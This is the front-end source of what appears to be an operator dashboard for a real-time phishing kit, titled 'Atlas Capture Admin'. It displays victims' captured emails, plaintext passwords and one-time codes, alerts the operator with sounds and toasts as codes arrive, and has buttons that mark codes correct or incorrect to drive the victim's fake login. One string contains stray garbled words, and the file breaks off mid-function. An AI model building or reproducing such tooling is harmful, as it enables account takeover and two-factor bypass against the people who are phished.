<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Atlas Capture Admin Dashboard</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --font-primary: 'Plus Jakarta Sans', 'Inter', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 20px;
            --radius-xl: 24px;
        }

        body {
            font-family: var(--font-primary);
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #4facfe 75%, #00f2fe 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: white;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass-navbar {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            padding: clamp(12px, 4vw, 16px) clamp(16px, 5vw, 32px);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            flex-wrap: wrap;
            gap: 12px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: clamp(8px, 2vw, 12px);
        }

        .logo img {
            height: clamp(35px, 6vw, 45px);
            width: clamp(35px, 6vw, 45px);
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            padding: 5px;
        }

        .logo h1 {
            font-size: clamp(16px, 5vw, 20px);
            font-weight: 700;
            color: white;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            letter-spacing: -0.3px;
        }

        .navbar-right {
            display: flex;
            gap: clamp(8px, 2vw, 12px);
            align-items: center;
            flex-wrap: wrap;
        }

        .glass-btn {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: clamp(6px, 2vw, 8px) clamp(12px, 3vw, 16px);
            border-radius: var(--radius-md);
            cursor: pointer;
            font-weight: 500;
            font-size: clamp(12px, 3vw, 14px);
            display: flex;
            align-items: center;
            gap: 6px;
            transition: var(--transition);
            color: white;
            font-family: var(--font-primary);
        }

        .glass-btn:hover {
            background: rgba(255, 255, 255, 0.25);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
        }

        .sound-toggle.active {
            background: rgba(16, 185, 129, 0.8);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .logout-btn {
            background: rgba(239, 68, 68, 0.8);
            border: none;
        }

        .logout-btn:hover {
            background: rgba(239, 68, 68, 1);
        }

        .container {
            max-width: 1400px;
            margin: clamp(16px, 4vw, 32px) auto;
            padding: 0 clamp(16px, 4vw, 24px);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(min(100%, 180px), 1fr));
            gap: clamp(12px, 3vw, 20px);
            margin-bottom: clamp(24px, 5vw, 32px);
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: var(--radius-lg);
            padding: clamp(16px, 4vw, 24px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, rgba(255, 255, 255, 0.5), rgba(255, 255, 255, 0.9));
        }

        .stat-card:hover {
            transform: translateY(-4px);
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }

        .stat-icon {
            width: clamp(36px, 8vw, 48px);
            height: clamp(36px, 8vw, 48px);
            background: rgba(255, 255, 255, 0.2);
            border-radius: var(--radius-md);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: clamp(10px, 3vw, 16px);
        }

        .stat-icon ion-icon {
            font-size: clamp(20px, 5vw, 28px);
            color: white;
        }

        .stat-card h3 {
            font-size: clamp(11px, 3vw, 14px);
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 6px;
            font-weight: 500;
        }

        .stat-card .number {
            font-size: clamp(22px, 6vw, 32px);
            font-weight: 800;
            color: white;
            letter-spacing: -1px;
        }

        .table-container {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border-radius: var(--radius-xl);
            border: 1px solid rgba(255, 255, 255, 0.2);
            overflow-x: auto;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 1300px;
        }

        th {
            text-align: left;
            padding: clamp(12px, 3vw, 16px) clamp(12px, 3vw, 20px);
            background: rgba(255, 255, 255, 0.1);
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            font-size: clamp(12px, 3vw, 14px);
            font-family: var(--font-primary);
        }

        td {
            padding: clamp(10px, 2.5vw, 14px) clamp(12px, 3vw, 20px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.9);
            font-size: clamp(12px, 2.5vw, 13px);
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: clamp(10px, 2.5vw, 11px);
            font-weight: 500;
        }

        .badge-pending { background: rgba(245, 158, 11, 0.3); color: #fef3c7; border: 1px solid rgba(245, 158, 11, 0.5); }
        .badge-approved { background: rgba(16, 185, 129, 0.3); color: #d1fae5; border: 1px solid rgba(16, 185, 129, 0.5); }
        .badge-waiting { background: rgba(79, 70, 229, 0.3); color: #e0e7ff; border: 1px solid rgba(79, 70, 229, 0.5); }
        .badge-email { background: rgba(249, 115, 22, 0.3); color: #fed7aa; border: 1px solid rgba(249, 115, 22, 0.5); }
        .badge-never { background: rgba(239, 68, 68, 0.3); color: #fecaca; border: 1px solid rgba(239, 68, 68, 0.5); }
        .badge-verified { background: rgba(16, 185, 129, 0.4); color: #a7f3d0; border: 1px solid rgba(16, 185, 129, 0.6); }

        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .action-btn {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: clamp(4px, 1.5vw, 6px) clamp(8px, 2vw, 12px);
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-size: clamp(10px, 2vw, 11px);
            font-weight: 500;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            gap: 4px;
            color: white;
            font-family: var(--font-primary);
        }

        .action-btn:hover {
            transform: translateY(-1px);
            background: rgba(255, 255, 255, 0.25);
        }

        .btn-success { background: rgba(16, 185, 129, 0.8); }
        .btn-approve { background: rgba(79, 70, 229, 0.8); }
        .btn-incorrect { background: rgba(239, 68, 68, 0.8); }
        .btn-never { background: rgba(139, 92, 246, 0.8); }
        .btn-reset { background: rgba(245, 158, 11, 0.8); }
        .btn-delete { background: rgba(107, 114, 128, 0.8); }

        .otp-code {
            cursor: pointer;
            padding: 4px 8px;
            border-radius: var(--radius-sm);
            background: rgba(255, 255, 255, 0.1);
            font-family: var(--font-mono);
            font-size: clamp(11px, 2.5vw, 13px);
            display: inline-block;
        }

        .copy-btn {
            background: transparent;
            color: rgba(255, 255, 255, 0.7);
            padding: 4px 6px;
            margin-left: 6px;
            font-size: clamp(10px, 2.5vw, 12px);
            border: none;
            cursor: pointer;
            transition: var(--transition);
        }

        .copy-btn:hover {
            color: white;
            transform: scale(1.05);
        }

        .toast-notification {
            position: fixed;
            top: clamp(70px, 10vh, 80px);
            right: clamp(16px, 4vw, 20px);
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(20px);
            border-left: 4px solid #4f46e5;
            padding: clamp(12px, 3vw, 16px) clamp(16px, 4vw, 20px);
            border-radius: var(--radius-md);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            display: none;
            z-index: 1000;
            animation: slideIn 0.3s ease;
            max-width: min(90vw, 350px);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 16px;
        }

        .modal-content {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: var(--radius-xl);
            padding: clamp(20px, 5vw, 24px);
            max-width: min(90vw, 500px);
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: #1f2937;
            max-height: 80vh;
            overflow-y: auto;
        }

        .dark .modal-content {
            background: rgba(30, 41, 59, 0.95);
            color: white;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        }

        .modal-header h3 {
            font-size: clamp(18px, 5vw, 20px);
            font-weight: 700;
        }

        .modal-field {
            margin-bottom: 16px;
        }

        .modal-label {
            font-size: clamp(11px, 2.5vw, 12px);
            color: #6b7280;
            margin-bottom: 4px;
        }

        .modal-value {
            font-size: clamp(13px, 3vw, 14px);
            font-weight: 500;
            word-break: break-all;
        }

        .value-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }

        .empty-state {
            text-align: center;
            padding: clamp(40px, 10vw, 60px);
            color: rgba(255, 255, 255, 0.7);
        }

        .empty-state ion-icon {
            font-size: clamp(48px, 12vw, 64px);
            margin-bottom: 16px;
        }

        .dark-mode {
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
        }

        .audio-activation-banner {
            position: fixed;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 50px;
            padding: 12px 24px;
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 1000;
            animation: pulse 1s ease-in-out infinite;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        .audio-activation-banner.hidden {
            display: none;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.9; transform: translateX(-50%) scale(1); }
            50% { opacity: 1; transform: translateX(-50%) scale(1.02); }
        }

        @media (max-width: 768px) {
            .action-buttons {
                flex-direction: column;
                gap: 4px;
            }
            
            .action-btn {
                width: 100%;
                justify-content: center;
            }
            
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 480px) {
            .stats {
                grid-template-columns: 1fr;
            }
            
            .glass-navbar {
                flex-direction: column;
                text-align: center;
            }
            
            .navbar-right {
                justify-content: center;
            }
        }

        .stat-card.has-new {
            animation: statPulse 1s ease-in-out 3;
            background: rgba(255, 255, 255, 0.25);
        }

        @keyframes statPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
    </style>
</head>
<body>

<div class="glass-navbar">
    <div class="logo">
        <img src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="Atlas logo">
        <h1>Atlas Capture Admin</h1>
    </div>
    <div class="navbar-right">
        <button class="glass-btn sound-toggle active" id="soundToggleBtn">
            <ion-icon name="volume-high-outline"></ion-icon>
            Sound ON
        </button>
        <button class="glass-btn theme-toggle" id="themeToggleBtn">
            <ion-icon name="moon-outline"></ion-icon>
            Dark Mode
        </button>
        <button class="glass-btn logout-btn" id="logoutBtn">
            <ion-icon name="log-out-outline"></ion-icon>
            Exit
        </button>
    </div>
</div>

<div id="toast" class="toast-notification">
    <h4 id="toastTitle"></h4>
    <p id="toastMessage"></p>
</div>

<div id="userModal" class="modal-overlay">
    <div class="modal-content">
        <div class="modal-header">
            <h3>User Details</h3>
            <button onclick="closeModal()" style="background: none; border: none; cursor: pointer;">
                <ion-icon name="close-outline" size="24"></ion-icon>
            </button>
        </div>
        <div id="modalContent"></div>
    </div>
</div>

<div class="container">
    <div class="stats" id="statsGrid">
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="people-outline"></ion-icon></div>
            <h3>Total Users</h3>
            <div class="number" id="totalUsers">0</div>
        </div>
        <div class="stat-card" id="pendingEmailCard">
            <div class="stat-icon"><ion-icon name="mail-outline"></ion-icon></div>
            <h3>Pending Email</h3>
            <div class="number" id="pendingEmail">0</div>
        </div>
        <div class="stat-card" id="pendingFirstCard">
            <div class="stat-icon"><ion-icon name="key-outline"></ion-icon></div>
            <h3>Pending OTP 1</h3>
            <div class="number" id="pendingFirstOTP">0</div>
        </div>
        <div class="stat-card" id="pendingSecondCard">
            <div class="stat-icon"><ion-icon name="shield-checkmark-outline"></ion-icon></div>
            <h3>Pending OTP 2</h3>
            <div class="number" id="pendingSecondOTP">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="checkmark-done-circle-outline"></ion-icon></div>
            <h3>Verified</h3>
            <div class="number" id="verifiedCount">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="ban-outline"></ion-icon></div>
            <h3>Blocked</h3>
            <div class="number" id="neverCount">0</div>
        </div>
    </div>

    <div class="table-container">
        <table id="usersTable">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>First OTP</th>
                    <th>Second OTP</th>
                    <th>Status</th>
                    <th>Created At</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="usersTableBody">
                <tr><td colspan="6" style="text-align:center; padding:40px;">Loading users...</td</tr>
            </tbody>
        </table>
    </div>
</div>

<script>
const token = localStorage.getItem('adminToken');
if (!token) window.location.href = '/admin/login';

// ==================== MP3 AUDIO ALERTS - ONLY FOR INCOMING EVENTS ====================
let soundEnabled = true;
let isAudioReady = false;
let audioContextInitialized = false;

const signupSound = new Audio('/static/signup.mp3');
const otpSound = new Audio('/static/otp.mp3');

signupSound.preload = 'auto';
otpSound.preload = 'auto';
signupSound.volume = 0.8;
otpSound.volume = 0.8;

function initAudio() {
    if (audioContextInitialized) return;
    try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        const audioContext = new AudioCtx();
        const gainNode = audioContext.createGain();
        const silentBuffer = audioContext.createBuffer(1, 1, 22050);
        const source = audioContext.createBufferSource();
        gainNode.gain.value = 0;
        gainNode.connect(audioContext.destination);
        source.buffer = silentBuffer;
        source.connect(gainNode);
        source.start(0);
        audioContext.resume().then(() => {
            audioContextInitialized = true;
            isAudioReady = true;
        }).catch(e => console.log('Audio error:', e));
    } catch(e) {
        const silentAudio = new Audio();
        silentAudio.volume = 0;
        silentAudio.play().then(() => {
            silentAudio.pause();
            isAudioReady = true;
            audioContextInitialized = true;
        }).catch(e => console.log('Audio fallback error:', e));
    }
}

function playSound(type) {
    if (!soundEnabled) return;
    if (!isAudioReady) {
        initAudio();
        setTimeout(() => playSound(type), 200);
        return;
    }
    const sound = type === 'signup' ? signupSound : otpSound;
    sound.currentTime = 0;
    sound.play().catch(e => console.log('Play error:', e));
}

function testSound() {
    playSound('signup');
    setTimeout(() => playSound('otp'), 800);
}

function toggleSound() {
    soundEnabled = !soundEnabled;
    const btn = document.getElementById('soundToggleBtn');
    if (soundEnabled) { 
        btn.innerHTML = '<ion-icon name="volume-high-outline"></ion-icon> Sound ON'; 
        btn.classList.add('active');
        testSound();
    } else { 
        btn.innerHTML = '<ion-icon name="volume-mute-outline"></ion-icon> Sound OFF'; 
        btn.classList.remove('active');
    }
}

initAudio();

// ==================== TOAST NOTIFICATION ====================
function showToast(title, message) {
    const toast = document.getElementById('toast');
    document.getElementById('toastTitle').textContent = title;
    document.getElementById('toastMessage').textContent = message;
    toast.style.display = 'block';
    setTimeout(() => toast.style.display = 'none', 4000);
    if (Notification.permission === 'granted') { 
        new Notification(title, { body: message }); 
    }
}

if (Notification.permission === 'default') {
    Notification.requestPermission();
}

// ==================== COPY TO CLIPBOARD ====================
function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    const toastMsg = document.createElement('div');
    toastMsg.style.cssText = 'position:fixed; bottom:80px; right:20px; background:#10b981; color:white; padding:10px 20px; border-radius:12px; z-index:1000; animation:fadeOut 2s forwards';
    toastMsg.innerHTML = '<ion-icon name="checkmark-circle-outline"></ion-icon> Copied!';
    document.body.appendChild(toastMsg);
    setTimeout(() => toastMsg.remove(), 2000);
}

// ==================== DATE FORMATTING ====================
function formatDate(dateString) { 
    const date = new Date(dateString); 
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    return `${year}-${month}-${day} ${hours}:${minutes}`; 
}

function escapeHtml(str) { 
    if (!str) return ''; 
    return str.replace(/[&<>]/g, function(m) { 
        if (m === '&') return '&amp;'; 
        if (m === '<') return '&lt;'; 
        if (m === '>') return '&gt;'; 
        return m; 
    }); 
}

// ==================== USER STATUS HELPERS ====================
function getStatusText(user) {
    if (user.otp1_never) return 'Blocked';
    if (!user.approved) return 'Pending Email';
    if (user.approved && user.otp && !user.otp1_correct) return 'Pending OTP 1';
    if (user.otp1_correct && user.second_otp && !user.otp2_correct) return 'Pending OTP 2';
    if (user.otp1_correct && user.otp2_correct) return 'Verified';
    return 'Pending';
}

function getStatusColor(user) {
    if (user.otp1_never) return '#ef4444';
    if (!user.approved) return '#f59e0b';
    if (user.approved && user.otp && !user.otp1_correct) return '#4f46e5';
    if (user.otp1_correct && user.second_otp && !user.otp2_correct) return '#9a8c98';
    if (user.otp1_correct && user.otp2_correct) return '#10b981';
    return '#6b7280';
}

// ==================== MODAL FUNCTIONS ====================
function openModal(user) {
    const modalContent = document.getElementById('modalContent');
    modalContent.innerHTML = `
        <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
        <div class="modal-field"><div class="modal-label">Password</div><div class="value-row"><div class="modal-value">${user.password || 'user'}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.password || 'user')}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
        <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
        <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
        <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
        <div class="modal-field"><div class="modal-label">Joined</div><div class="modal-value">${formatDate(user.created_at)}</div></div>
    `;
    document.getElementById('userModal').style.display = 'flex';
}

function closeModal() { 
    document.getElementById('userModal').style.display = 'none'; 
}

// ==================== TRACK PREVIOUS STATE FOR INCOMING EVENTS ONLY ====================
let previousUserMap = new Map();
let isFirstLoad = true;

function checkForNewEvents(users) {
    if (isFirstLoad) {
        users.forEach(user => {
            previousUserMap.set(user.email, {
                approved: user.approved,
                otp: user.otp,
                second_otp: user.second_otp,
                otp1_never: user.otp1_never,
                otp1_correct: user.otp1_correct,
                otp2_correct: user.otp2_correct
            });
        });
        isFirstLoad = false;
        return;
    }

    users.forEach(user => {
        const previous = previousUserMap.get(user.email);
        
        if (!previous) {
            if (!user.otp1_never) {
                playSound('signup');
                showToast('New Signup', `${user.email} signed up`);
            }
        } else {
            if (!previous.otp && user.otp && !user.otp1_never && !user.otp1_correct) {
                playSound('otp');
                showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
            }
            if (!previous.second_otp && user.second_otp && !user.otp1_never && !user.otp2_correct) {
                playSound('otp');
                showToast('Second OTP', `${user.email} submitted second OTP`);
            }
        }
        
        previousUserMap.set(user.email, {
            approved: user.approved,
            otp: user.otp,
            second_otp: user.second_otp,
            otp1_never: user.otp1_never,
            otp1_correct: user.otp1_correct,
            otp2_correct: user.otp2_correct
        });
    });
}

// ==================== FETCH USERS ====================
async function fetchUsers() {
    try {
        const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
        if (response.status === 403) { 
            localStorage.removeItem('adminToken'); 
            window.location.href = '/admin/login'; 
            return; 
        }
        const users = await response.json();
        checkForNewEvents(users);
        displayUsers(users);
        updateStats(users);
    } catch(err) { 
        console.error(err); 
    }
}

function updateStats(users) {
    const total = users.length;
    const pendingEmail = users.filter(u => !u.approved && !u.otp1_never).length;
    const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct && !u.otp1_never).length;
    const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct && !u.otp1_never).length;
    const verified = users.filter(u => u.otp1_correct && u.otp2_correct && !u.otp1_never).length;
    const never = users.filter(u => u.otp1_never).length;
    
    document.getElementById('totalUsers').textContent = total;
    document.getElementById('pendingEmail').textContent = pendingEmail;
    document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
    document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
    document.getElementById('verifiedCount').textContent = verified;
    document.getElementById('neverCount').textContent = never;
}

function displayUsers(users) {
    const tbody = document.getElementById('usersTableBody');
    if (!users.length) { 
        tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div>NonNullList facultative'; 
        return; 
    }
    
    tbody.innerHTML = users.map(user => {
        let statusBadge = '';
        
        if (user.otp1_never) {
            statusBadge = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> Blocked</span>';
        }
        else if (!user.approved) {
            statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
        }
        else if (user.approved && user.otp && !user.otp1_correct) {
            statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> Pending OTP 1</span>';
        }
        else if (user.otp1_correct && user.second_otp && !user.otp2_correct) {
            statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-outline"></ion-icon> Pending OTP 2</span>';
        }
        else if (user.otp1_correct && user.otp2_correct) {
            statusBadge = '<span class="badge badge-verified"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
        }
        
        let actionButtons = `<div class="action-buttons">`;
        
        if (!user.otp1_never && !user.approved) {
            actionButtons += `<button class="action-btn btn-approve" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon>Approve</button>`;
        }
        else if (!user.otp1_never && user.approved && user.otp && !user.otp1_correct) {
            actionButtons += `<button class="action-btn btn-success" onclick="successFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="star-outline"></ion-icon>Success</button>
                            <button class="action-btn btn-approve" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
                            <button class="action-btn btn-incorrect" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
                            <button class="action-btn btn-never" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon>Never</button>
                            <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
        }
        else if (!user.otp1_never && user.otp1_correct && user.second_otp && !user.otp2_correct) {
            actionButtons += `<button class="action-btn btn-approve" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
                            <button class="action-btn btn-incorrect" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
                            <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
        }
        else if (!user.otp1_never && user.otp1_correct && user.otp2_correct) {
            actionButtons += `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
        }
        
        actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
        
        return `<tr>
            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${statusBadge}</td>
            <td onclick="openModal({email:'${escapeHtml(user.email)}', password:'${escapeHtml(user.password || 'user')}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${formatDate(user.created_at)}</td>
            <td>${actionButtons}</td>
        </tr>`;
    }).join('');
}

// ==================== API CALLS - NO SOUNDS FOR ADMIN ACTIONS ====================
async function apiCall(endpoint, method, email, successMsg, errorMsg) {
    try {
        const response = await fetch(endpoint, { 
            method, 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ email }) 
        });
        const data = await response.json();
        if (data.success) { 
            showToast('Success', successMsg); 
            fetchUsers(); 
        } else { 
            showToast('Error', data.detail || errorMsg); 
        }
    } catch(e) { 
        showToast('Error', 'Network error'); 
    }
}

function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be blocked.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP incorrect', 'Failed'); }
function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed'); }

// ==================== THEME SETUP ====================
function setupTheme() {
    const savedTheme = localStorage.getItem('theme');
